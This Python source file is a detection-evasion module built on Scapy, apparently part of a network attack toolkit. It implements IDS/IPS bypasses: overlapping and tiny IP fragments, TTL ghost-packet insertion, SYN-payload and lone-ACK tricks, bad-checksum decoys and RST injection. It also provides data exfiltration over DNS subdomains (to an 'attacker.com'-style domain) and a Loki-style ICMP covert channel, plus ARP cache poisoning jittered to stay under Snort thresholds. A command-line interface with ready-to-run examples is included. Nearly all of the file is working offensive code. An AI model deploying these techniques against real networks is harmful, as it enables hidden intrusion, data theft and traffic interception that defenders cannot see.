#!/usr/bin/env python3
"""
Detection Evasion Module - ClaudeCodeIPTool
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

IDS/IPS bypass primitives based on Ptacek-Newsham (1998) insertion/evasion model.
Import as a module or run standalone for evasion analysis.

Core principle: IDS and target reconstruct packet streams differently.
Insert ghost packets the IDS processes but the target ignores (insertion),
or craft packets the target accepts but the IDS drops (evasion).

Techniques from O'Reilly Network Intrusion Detection 3rd Ed:
- IP fragmentation overlap (RFC 791 reassembly ambiguity)
- TTL-expiry ghost packet insertion
- Bad checksum IDS bypass
- TCP SYN+payload (IDS inspects post-handshake only)
- Lone ACK stateful firewall bypass
- Rate limiting (5pps threshold evasion, 60-day slow-burn)
- IP ID randomization (defeats scan correlation)
- ICMP covert channel (Loki-style, type 0 echo reply carrier)
- DNS evasion: RFC 1035 compression pointers, case variation, label encoding
- ARP jitter: randomized interval defeats threshold detectors

CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
"""

import random
import socket
import struct
import time
import threading
import ipaddress
from typing import Iterator

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, ARP, Ether, DNS, DNSQR, DNSRR, Raw,
        send, sendp, sr1, sr, conf, fragment, checksum
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


# ─── Rate Limiting / Timing ────────────────────────────────────────────────────

class RateLimiter:
    """
    Adaptive rate limiting to stay below IDS detection thresholds.

    IDS detection models (from Network Intrusion Detection 3rd Ed):
    - Burst: >N packets in T seconds → alert (most common, easily evaded)
    - Velocity: pps over sliding window
    - Statistical: anomaly from baseline (hardest to evade)
    - Pattern correlation: scan signature across time

    Thresholds observed in practice:
    - Snort portscan: 15 ports/host in 60s default
    - OSSEC: 6 auth failures in 120s
    - Typical SIEM: 50 connection attempts/min
    """

    # IDS time windows and safe rates (packets per window)
    PROFILES = {
        "silent":    {"pps": 0.083, "jitter": 0.5,  "desc": "5/min — below most threshold scanners"},
        "slow":      {"pps": 0.5,   "jitter": 0.3,  "desc": "30/min — slow below burst detection"},
        "normal":    {"pps": 2.0,   "jitter": 0.2,  "desc": "2/sec — mimics human browsing"},
        "aggressive":{"pps": 10.0,  "jitter": 0.1,  "desc": "10/sec — faster, more detectable"},
        "paranoid":  {"pps": 0.002, "jitter": 0.8,  "desc": "5/hour — 60-day slow-burn scan"},
    }

    def __init__(self, profile: str = "slow"):
        p = self.PROFILES.get(profile, self.PROFILES["slow"])
        self.base_interval = 1.0 / p["pps"]
        self.jitter_factor = p["jitter"]
        self.profile = profile
        self.sent = 0
        self._last = 0.0

    def wait(self):
        """Sleep for jittered interval before next packet."""
        jitter = random.uniform(-self.jitter_factor, self.jitter_factor)
        interval = max(0, self.base_interval * (1 + jitter))
        elapsed = time.time() - self._last
        remaining = interval - elapsed
        if remaining > 0:
            time.sleep(remaining)
        self._last = time.time()
        self.sent += 1

    def __iter__(self) -> Iterator[int]:
        """Iterate yielding packet index; caller sends packet between yields."""
        n = 0
        while True:
            self.wait()
            yield n
            n += 1

    @classmethod
    def describe(cls):
        """Print all available profiles."""
        for name, p in cls.PROFILES.items():
            print(f"  {name:12s} {p['pps']:.3f} pps — {p['desc']}")


# ─── IP ID Randomization ──────────────────────────────────────────────────────

class IPIDRandomizer:
    """
    Randomize IP ID field to defeat scan correlation.

    Snort and Zeek correlate packets from the same source using predictable
    IP ID sequences (Linux: global counter; Windows: per-connection). Random
    ID breaks this correlation, making distributed scans look like noise.
    """

    def __init__(self, strategy: str = "random"):
        self.strategy = strategy
        self._counter = random.randint(0, 65535)
        self._per_dst = {}

    def get(self, dst: str = None) -> int:
        if self.strategy == "random":
            return random.randint(1, 65535)
        elif self.strategy == "zero":
            return 0  # RFC 6864: DF-flagged packets may use 0
        elif self.strategy == "per_dst":
            if dst not in self._per_dst:
                self._per_dst[dst] = random.randint(0, 65535)
            v = self._per_dst[dst]
            self._per_dst[dst] = (v + 1) % 65536
            return v
        else:  # sequential
            v = self._counter
            self._counter = (self._counter + 1) % 65536
            return v

    def apply(self, pkt) -> object:
        """Apply randomized ID to a Scapy IP packet."""
        if pkt.haslayer(IP):
            pkt[IP].id = self.get(pkt[IP].dst)
        return pkt


# ─── IP Fragmentation Overlap (Ptacek-Newsham) ───────────────────────────────

class FragmentOverlap:
    """
    Ptacek-Newsham fragment overlap evasion (1998).

    Strategy: send two overlapping fragments.
    Fragment 1: offset=0, contains benign payload bytes 0-7
    Fragment 2: offset=0 (overlaps!), contains malicious payload bytes 0-N

    RFC 791 is ambiguous on overlap resolution:
    - BSD/Linux: last fragment wins (overwrite policy)
    - Some IDS: first fragment wins (insert policy)
    → IDS sees benign bytes, target reassembles malicious payload.

    Modern Snort with stream5 normalization partially mitigates this,
    but many commercial IDS/IPS still have gaps on non-TCP protocols.
    """

    def __init__(self, src: str, dst: str, iface: str = None):
        self.src = src
        self.dst = dst
        self.iface = iface

    def send_overlapping(self, payload: bytes, proto: int = 17,
                         decoy_payload: bytes = None):
        """
        Send overlapping IP fragments.

        Fragment 1 (decoy): offset=0, 8 bytes of benign data
        Fragment 2 (real):  offset=0, full malicious payload

        Some IDS process frag 1 first → see benign bytes.
        Target uses last-writer-wins → sees real payload.
        """
        decoy = decoy_payload or (b'\x00' * 8)

        # Fragment 1: MF=1, offset=0, short decoy
        frag1 = (
            IP(src=self.src, dst=self.dst, proto=proto,
               flags="MF", frag=0, id=0x1234) /
            Raw(load=decoy)
        )

        # Fragment 2: MF=0, offset=0 (overlaps frag1), real payload
        frag2 = (
            IP(src=self.src, dst=self.dst, proto=proto,
               flags=0, frag=0, id=0x1234) /
            Raw(load=payload)
        )

        send(frag1, verbose=0, iface=self.iface)
        time.sleep(0.05)
        send(frag2, verbose=0, iface=self.iface)

    def send_tiny_frags(self, pkt, frag_size: int = 8):
        """
        Fragment into 8-byte pieces to overwhelm IDS reassembly buffers.
        Some IDS impose reassembly timeouts or buffer limits — tiny frags
        trigger incomplete reassembly, causing the IDS to miss the content.
        """
        frags = fragment(pkt, fragsize=frag_size)
        for f in frags:
            send(f, verbose=0, iface=self.iface)
            time.sleep(random.uniform(0.01, 0.05))


# ─── TTL Ghost Packet Insertion ───────────────────────────────────────────────

class TTLInsertion:
    """
    Ptacek-Newsham TTL insertion attack.

    Ghost packets have a TTL that expires before reaching the target
    but is high enough that the IDS (closer to source) processes them.

    IDS sees: [GHOST][REAL_PAYLOAD][GHOST][REAL_PAYLOAD]
    Target sees: [REAL_PAYLOAD][REAL_PAYLOAD]  (ghosts expired en route)

    Result: IDS signature splits across the ghost bytes → no match.

    Requires knowing approximate hop count to target (traceroute first).
    Ghost TTL = hops_to_target - 1
    """

    def __init__(self, src: str, dst: str,
                 hops_to_target: int = 10, iface: str = None):
        self.src = src
        self.dst = dst
        self.ghost_ttl = max(1, hops_to_target - 1)
        self.real_ttl = 64
        self.iface = iface

    def send_with_ghosts(self, tcp_payload: bytes, dport: int = 80,
                         ghost_bytes: bytes = None):
        """
        Interleave real TCP payload bytes with ghost packets.

        Signature "ATTACK" becomes "AT[ghost]TA[ghost]CK" at IDS,
        "ATTACK" at target.
        """
        ghost = ghost_bytes or b'XX'
        sport = random.randint(1024, 65535)

        # Build ghost packets (TTL expires before target)
        def ghost_pkt(payload_chunk):
            return (
                IP(src=self.src, dst=self.dst, ttl=self.ghost_ttl) /
                TCP(sport=sport, dport=dport, flags="PA") /
                Raw(load=payload_chunk)
            )

        # Build real packets (full TTL, reach target)
        def real_pkt(payload_chunk):
            return (
                IP(src=self.src, dst=self.dst, ttl=self.real_ttl) /
                TCP(sport=sport, dport=dport, flags="PA") /
                Raw(load=payload_chunk)
            )

        # Interleave: real byte, ghost byte, real byte, ghost byte...
        for i in range(0, len(tcp_payload), 4):
            chunk = tcp_payload[i:i+4]
            send(real_pkt(chunk), verbose=0, iface=self.iface)
            send(ghost_pkt(ghost[:4]), verbose=0, iface=self.iface)


# ─── TCP Evasion Techniques ───────────────────────────────────────────────────

class TCPEvasion:
    """
    TCP-level IDS evasion:
    - SYN+payload: data in SYN bypasses post-handshake IDS
    - Lone ACK: no SYN → stateful FW accepts as "established"
    - Bad checksum decoy: IDS may not validate checksums, target drops
    - RST insertion: inject RST to confuse IDS stream tracking
    """

    def __init__(self, src: str, dst: str, iface: str = None):
        self.src = src
        self.dst = dst
        self.iface = iface

    def syn_with_payload(self, dport: int, payload: bytes):
        """
        Embed payload in TCP SYN packet.

        Many IDS only inspect POST-handshake data (after SYN-SYN/ACK-ACK).
        SYN+data is technically valid (RFC 793 allows it, implementations vary).
        Payload bytes in SYN are invisible to signature engines that wait
        for established state before running rules.
        """
        pkt = (
            IP(src=self.src, dst=self.dst) /
            TCP(sport=random.randint(1024, 65535), dport=dport,
                flags="S", seq=random.randint(0, 2**32-1)) /
            Raw(load=payload[:4])  # 4 bytes in SYN
        )
        send(pkt, verbose=0, iface=self.iface)

    def lone_ack(self, dport: int, seq: int = None, ack: int = None):
        """
        Send ACK with no prior SYN.

        Stateless firewall rules allowing "established" connections (--state ESTABLISHED)
        pass lone ACKs because they don't track per-connection state.
        ACK scan: target OS sends RST (no matching connection), but packet got through FW.
        """
        pkt = (
            IP(src=self.src, dst=self.dst) /
            TCP(sport=random.randint(1024, 65535), dport=dport,
                flags="A",
                seq=seq or random.randint(0, 2**32-1),
                ack=ack or random.randint(0, 2**32-1))
        )
        send(pkt, verbose=0, iface=self.iface)

    def bad_checksum_decoy(self, dport: int, payload: bytes):
        """
        Send packet with invalid TCP checksum as decoy.

        Target OS drops it (checksum validation). IDS that skips checksum
        validation (performance optimization) processes the content.
        Use before real payload to poison IDS stream state.
        """
        pkt = (
            IP(src=self.src, dst=self.dst) /
            TCP(sport=random.randint(1024, 65535), dport=dport,
                flags="PA", chksum=0xDEAD) /
            Raw(load=payload)
        )
        send(pkt, verbose=0, iface=self.iface)

    def rst_inject(self, dport: int, seq: int):
        """
        Inject RST to confuse IDS TCP stream tracker.

        If IDS tracks connection state and sees RST, it may close its
        tracking entry. Subsequent packets on same tuple are no longer
        associated with prior stream → signature context lost.
        """
        pkt = (
            IP(src=self.src, dst=self.dst) /
            TCP(sport=random.randint(1024, 65535), dport=dport,
                flags="R", seq=seq)
        )
        send(pkt, verbose=0, iface=self.iface)


# ─── DNS Evasion ──────────────────────────────────────────────────────────────

class DNSEvasion:
    """
    DNS query obfuscation to bypass signature-based DNS inspection.

    Techniques (from Network Intrusion Detection Ch.11):
    - Case variation: DNS is case-insensitive; IDS string match is case-sensitive
    - Label encoding variants: same name, different wire encoding
    - RFC 1035 compression pointers: reorder label decoding (c0 prefix = pointer)
    - Query type variation: ANY vs A vs AAAA for same host
    - Subdomain randomization: random prefix defeats NXDOMAIN caching
    - Long query chain: deeply nested CNAME chain per resolution
    """

    def __init__(self, nameserver: str = "8.8.8.8", port: int = 53):
        self.nameserver = nameserver
        self.port = port

    def case_varied(self, domain: str) -> str:
        """Random case variation of domain name."""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in domain
        )

    def subdomain_random(self, domain: str, prefix_len: int = 8) -> str:
        """Random subdomain prefix defeats NXDOMAIN response caching."""
        prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789',
                                         k=prefix_len))
        return f"{prefix}.{domain}"

    def query_varied(self, domain: str, qtype: str = None) -> object:
        """Send DNS query with case variation and random qtype."""
        qtypes = ["A", "AAAA", "TXT", "MX", "ANY"]
        qt = qtype or random.choice(qtypes)
        varied = self.case_varied(domain)
        pkt = (
            IP(dst=self.nameserver) /
            UDP(dport=self.port) /
            DNS(rd=1, qd=DNSQR(qname=varied, qtype=qt))
        )
        return pkt

    def build_compression_ptr_query(self, domain: str) -> bytes:
        """
        Build DNS query with RFC 1035 compression pointer.

        Compression pointer: 0xC0 prefix + 1-byte offset into packet.
        IDS doing simple string matching on raw bytes misses the name;
        proper parser follows the pointer and reconstructs it correctly.

        Wire format for example.com with pointer:
        [07]example[c0][0c] → pointer to offset 12 (the .com label)
        """
        labels = domain.rstrip('.').split('.')
        # Build normal encoded name then replace last label with pointer
        name_bytes = b''
        for label in labels[:-1]:
            name_bytes += bytes([len(label)]) + label.encode()
        # Add compression pointer to a pre-encoded TLD elsewhere in packet
        # (simplified: point to offset 12 which we'll place the TLD)
        name_bytes += b'\xc0\x0c'  # pointer to offset 12

        header = struct.pack('>HHHHHH',
            random.randint(1, 65535),  # ID
            0x0100,   # QR=0 RD=1
            1, 0, 0, 0  # QDCOUNT=1
        )
        # Query section
        qtype = b'\x00\x01'   # A record
        qclass = b'\x00\x01'  # IN

        # TLD at offset 12 (after 12-byte header) — where pointer points
        # Note: offset 12 is start of QNAME; we arrange so last label is there
        # This is illustrative - full implementation requires careful offset math
        return header + name_bytes + qtype + qclass

    def covert_channel_query(self, data: bytes, domain: str) -> list:
        """
        DNS covert channel: encode data as hex subdomains.
        data → hex → chunks → <chunk>.attacker.com A query
        Response carries data back (A record = 4 bytes).
        """
        hex_data = data.hex()
        chunk_size = 30  # max label length is 63
        chunks = [hex_data[i:i+chunk_size]
                  for i in range(0, len(hex_data), chunk_size)]
        pkts = []
        for i, chunk in enumerate(chunks):
            qname = f"{i:04d}.{chunk}.{domain}"
            pkt = (
                IP(dst=self.nameserver) /
                UDP(dport=self.port) /
                DNS(rd=1, qd=DNSQR(qname=qname, qtype="A"))
            )
            pkts.append(pkt)
        return pkts


# ─── ICMP Covert Channel (Loki-style) ────────────────────────────────────────

class ICMPCovertChannel:
    """
    ICMP covert channel — Loki (1996) style.

    ICMP Echo Request/Reply type 0/8 carry arbitrary payload in the
    data field. Most firewalls pass ICMP echo (ping) without inspection.
    Many IDS do not inspect ICMP payload bytes for signatures.

    Encode arbitrary data in ICMP type 0 (Echo Reply) payloads —
    replies are less suspicious than unsolicited requests.

    Detection: unusual ICMP payload size or non-zero data are indicators.
    Evasion: mimic OS ICMP payload sizes (Windows=32B, Linux=56B).
    """

    OS_PAYLOADS = {
        "windows": b'abcdefghijklmnopqrstuvwxyzabcdef',  # 32 bytes
        "linux":   bytes(range(8, 64)),                   # 56 bytes (8-63)
        "cisco":   b'\x00' * 72,                          # 72 bytes
    }

    def __init__(self, src: str, dst: str, iface: str = None,
                 os_mimic: str = "linux"):
        self.src = src
        self.dst = dst
        self.iface = iface
        self.base_payload = self.OS_PAYLOADS.get(os_mimic, self.OS_PAYLOADS["linux"])

    def _encode(self, data: bytes, seq: int) -> bytes:
        """XOR-encode data into ICMP payload with OS-mimicking size."""
        pad = self.base_payload * ((len(data) // len(self.base_payload)) + 1)
        key = pad[:len(data)]
        encoded = bytes(a ^ b for a, b in zip(data, key))
        # Pad to OS-expected length
        return (encoded + self.base_payload)[:len(self.base_payload)]

    def send(self, data: bytes, chunk_size: int = 16):
        """Send data split across multiple ICMP echo replies."""
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        for seq, chunk in enumerate(chunks):
            payload = self._encode(chunk, seq)
            pkt = (
                IP(src=self.src, dst=self.dst) /
                ICMP(type=0, code=0, id=0x1337, seq=seq) /  # type 0 = echo reply
                Raw(load=payload)
            )
            send(pkt, verbose=0, iface=self.iface)
            time.sleep(random.uniform(0.5, 2.0))

    def listen(self, timeout: int = 30) -> bytes:
        """Receive data from ICMP covert channel."""
        from scapy.all import sniff
        received = {}

        def handler(pkt):
            if pkt.haslayer(ICMP) and pkt[ICMP].type == 0 and pkt[ICMP].id == 0x1337:
                seq = pkt[ICMP].seq
                payload = bytes(pkt[Raw].load) if pkt.haslayer(Raw) else b''
                if payload:
                    pad = self.base_payload * ((len(payload) // len(self.base_payload)) + 1)
                    key = pad[:len(payload)]
                    decoded = bytes(a ^ b for a, b in zip(payload, key))
                    received[seq] = decoded

        sniff(filter="icmp", prn=handler, timeout=timeout, store=0,
              iface=self.iface)
        return b''.join(received[k] for k in sorted(received.keys()))


# ─── ARP Jitter ───────────────────────────────────────────────────────────────

class ARPJitter:
    """
    Randomized ARP poison intervals to evade threshold-based detection.

    SIEM/IDS ARP spoof detection: N ARP replies for same IP in T seconds.
    Typical threshold: 5 replies/10 seconds (Snort arp-spoof preprocessor).

    Jittered interval keeps reply rate below threshold while maintaining
    effective cache poisoning (ARP cache timeout = 20 min idle / 3 min active).
    """

    def __init__(self, target_ip: str, spoof_ip: str,
                 our_mac: str, target_mac: str,
                 iface: str = None,
                 min_interval: float = 15.0,
                 max_interval: float = 45.0):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.our_mac = our_mac
        self.target_mac = target_mac
        self.iface = iface
        self.min_interval = min_interval
        self.max_interval = max_interval
        self.count = 0

    def _poison_pkt(self) -> object:
        return (
            Ether(dst=self.target_mac) /
            ARP(op=2, psrc=self.spoof_ip, hwsrc=self.our_mac,
                pdst=self.target_ip, hwdst=self.target_mac)
        )

    def run(self):
        """Send jittered ARP poisons indefinitely."""
        print(f"[*] ARP jitter: poisoning {self.target_ip} at "
              f"{self.min_interval:.0f}-{self.max_interval:.0f}s intervals "
              f"(below threshold detectors)")
        try:
            while True:
                sendp(self._poison_pkt(), verbose=0, iface=self.iface)
                self.count += 1
                interval = random.uniform(self.min_interval, self.max_interval)
                if self.count % 10 == 0:
                    print(f"[*] {self.count} ARP poisons sent")
                time.sleep(interval)
        except KeyboardInterrupt:
            print(f"\n[+] Stopped after {self.count} ARP poisons")


# ─── Evasion Profile Wrapper ──────────────────────────────────────────────────

class EvasionConfig:
    """
    Convenience wrapper: combine multiple evasion techniques into a profile.
    Import this in other tools to add --evasion flag support.

    Usage:
        from evasion import EvasionConfig
        ev = EvasionConfig(profile="slow", ttl_ghost=True, ip_id_random=True)
        pkt = ev.apply(IP(dst=target)/TCP(dport=80)/payload)
        ev.send(pkt)
    """

    def __init__(self, profile: str = "slow",
                 ttl_ghost: bool = False,
                 ip_id_random: bool = True,
                 frag_tiny: bool = False,
                 dns_case: bool = False,
                 iface: str = None):
        self.rate = RateLimiter(profile)
        self.id_rand = IPIDRandomizer() if ip_id_random else None
        self.frag = frag_tiny
        self.dns_case = dns_case
        self.ttl_ghost = ttl_ghost
        self.iface = iface

    def apply(self, pkt) -> object:
        """Apply configured evasion transforms to packet."""
        if self.id_rand:
            pkt = self.id_rand.apply(pkt)
        return pkt

    def send(self, pkt, count: int = 1):
        """Rate-limited send with transforms applied."""
        for _ in range(count):
            self.rate.wait()
            p = self.apply(pkt)
            send(p, verbose=0, iface=self.iface)

    def sendp(self, pkt, count: int = 1):
        """Rate-limited L2 send."""
        for _ in range(count):
            self.rate.wait()
            p = self.apply(pkt)
            sendp(p, verbose=0, iface=self.iface)


# ─── CLI ─────────────────────────────────────────────────────────────────────

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Detection Evasion Module - IDS/IPS bypass primitives",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  profiles        - List rate-limiting profiles and thresholds
  frag-overlap    - Send overlapping IP fragments (Ptacek-Newsham evasion)
  frag-tiny       - Fragment into 8-byte pieces (overwhelm reassembly)
  syn-payload     - Send TCP SYN with embedded payload (pre-handshake bypass)
  lone-ack        - Send lone ACK (stateless firewall bypass)
  bad-checksum    - Send decoy with invalid checksum (IDS-only processing)
  icmp-covert     - ICMP covert channel sender (Loki-style)
  dns-case        - DNS query with case variation (signature evasion)
  arp-jitter      - ARP poisoning with randomized intervals (threshold evasion)
  rate-test       - Send N packets at chosen profile rate and measure

Examples:
  # List all rate profiles
  python3 evasion.py profiles

  # Fragment overlap evasion
  sudo python3 evasion.py frag-overlap --src 10.0.0.1 --dst 10.0.0.2 --payload "GET / HTTP/1.1"

  # SYN+payload to bypass post-handshake IDS
  sudo python3 evasion.py syn-payload --dst 10.0.0.2 --dport 80 --payload "ATTACK"

  # ICMP covert channel
  sudo python3 evasion.py icmp-covert --dst 10.0.0.2 --data "secret message"

  # Jittered ARP poison (evades Snort arp-spoof preprocessor)
  sudo python3 evasion.py arp-jitter --target 192.168.1.100 --spoof 192.168.1.1 \\
       --our-mac de:ad:be:ef:00:01 --target-mac aa:bb:cc:dd:ee:ff

  # Rate test: 20 packets at "silent" profile (5/min)
  sudo python3 evasion.py rate-test --dst 10.0.0.2 --count 20 --profile silent

Module Import (for other tools):
  from evasion import EvasionConfig, RateLimiter
  ev = EvasionConfig(profile="slow", ip_id_random=True)
  ev.send(IP(dst=target)/TCP(dport=80))

Ptacek-Newsham Model (1998):
  IDS and target reconstruct byte streams differently.
  Insertion: send packets IDS accepts but target ignores (bad TTL, bad checksum).
  Evasion:   send packets target accepts but IDS drops (overlapping fragments).
  Both techniques split signatures across the anomalous bytes.

CONTROLLED ENVIRONMENT ONLY
        """
    )

    parser.add_argument("mode", choices=[
        "profiles", "frag-overlap", "frag-tiny", "syn-payload",
        "lone-ack", "bad-checksum", "icmp-covert", "dns-case",
        "arp-jitter", "rate-test"
    ])
    parser.add_argument("--src", help="Source IP")
    parser.add_argument("--dst", help="Target IP")
    parser.add_argument("--dport", type=int, default=80)
    parser.add_argument("--payload", default="HELLO")
    parser.add_argument("--data", default="test")
    parser.add_argument("--target", help="ARP: target IP")
    parser.add_argument("--spoof", help="ARP: IP to spoof")
    parser.add_argument("--our-mac", help="ARP: attacker MAC")
    parser.add_argument("--target-mac", help="ARP: target MAC")
    parser.add_argument("--profile", default="slow",
                        choices=list(RateLimiter.PROFILES.keys()))
    parser.add_argument("--count", type=int, default=10)
    parser.add_argument("--nameserver", default="8.8.8.8")
    parser.add_argument("--domain", default="example.com")
    parser.add_argument("--iface", help="Network interface")
    parser.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()

    if not HAS_SCAPY and args.mode != "profiles":
        print("[!] Scapy required: pip install scapy")
        return

    if args.mode == "profiles":
        print("Rate-limiting profiles:")
        RateLimiter.describe()
        print("\nIDS detection thresholds (typical):")
        print("  Snort portscan:   15 ports/host in 60s")
        print("  OSSEC brute:       6 failures in 120s")
        print("  Generic SIEM:     50 connections/min")
        print("  Zeek scan:        25+ failed conns → scan.log")

    elif args.mode == "frag-overlap":
        src = args.src or "10.0.0.1"
        ev = FragmentOverlap(src=src, dst=args.dst, iface=args.iface)
        ev.send_overlapping(args.payload.encode())
        print(f"[+] Overlapping fragments sent: {src} → {args.dst}")
        print(f"    IDS sees: benign decoy | Target reassembles: real payload")

    elif args.mode == "frag-tiny":
        src = args.src or "10.0.0.1"
        pkt = IP(src=src, dst=args.dst)/UDP(dport=args.dport)/Raw(args.payload.encode())
        ev = FragmentOverlap(src=src, dst=args.dst, iface=args.iface)
        ev.send_tiny_frags(pkt, frag_size=8)
        print(f"[+] Tiny 8-byte fragments sent")

    elif args.mode == "syn-payload":
        tc = TCPEvasion(src=args.src or "10.0.0.1", dst=args.dst, iface=args.iface)
        tc.syn_with_payload(args.dport, args.payload.encode())
        print(f"[+] SYN+payload sent to {args.dst}:{args.dport}")
        print(f"    Post-handshake IDS misses pre-handshake data")

    elif args.mode == "lone-ack":
        tc = TCPEvasion(src=args.src or "10.0.0.1", dst=args.dst, iface=args.iface)
        tc.lone_ack(args.dport)
        print(f"[+] Lone ACK sent to {args.dst}:{args.dport}")
        print(f"    Stateless FW accepts (matches ESTABLISHED); target sends RST")

    elif args.mode == "bad-checksum":
        tc = TCPEvasion(src=args.src or "10.0.0.1", dst=args.dst, iface=args.iface)
        tc.bad_checksum_decoy(args.dport, args.payload.encode())
        print(f"[+] Bad-checksum decoy sent")
        print(f"    Target drops (invalid); IDS without checksum validation sees payload")

    elif args.mode == "icmp-covert":
        src = args.src or "10.0.0.1"
        cc = ICMPCovertChannel(src=src, dst=args.dst, iface=args.iface)
        cc.send(args.data.encode())
        print(f"[+] ICMP covert channel: {len(args.data)} bytes → {args.dst}")

    elif args.mode == "dns-case":
        dns_ev = DNSEvasion(nameserver=args.nameserver)
        varied = dns_ev.case_varied(args.domain)
        pkt = dns_ev.query_varied(args.domain)
        send(pkt, verbose=0, iface=args.iface)
        print(f"[+] DNS query with case variation: {args.domain} → {varied}")

    elif args.mode == "arp-jitter":
        jitter = ARPJitter(
            target_ip=args.target, spoof_ip=args.spoof,
            our_mac=args.our_mac, target_mac=args.target_mac,
            iface=args.iface
        )
        jitter.run()

    elif args.mode == "rate-test":
        rate = RateLimiter(args.profile)
        print(f"[*] Rate test: {args.count} packets at '{args.profile}' profile")
        print(f"    Target rate: {rate.base_interval:.2f}s interval")
        start = time.time()
        for i in rate:
            pkt = IP(src=args.src or "10.0.0.1", dst=args.dst)/ICMP()
            send(pkt, verbose=0, iface=args.iface)
            if i + 1 >= args.count:
                break
        elapsed = time.time() - start
        print(f"[+] Sent {args.count} packets in {elapsed:.1f}s "
              f"({args.count/elapsed:.2f} pps actual)")


if __name__ == "__main__":
    main()
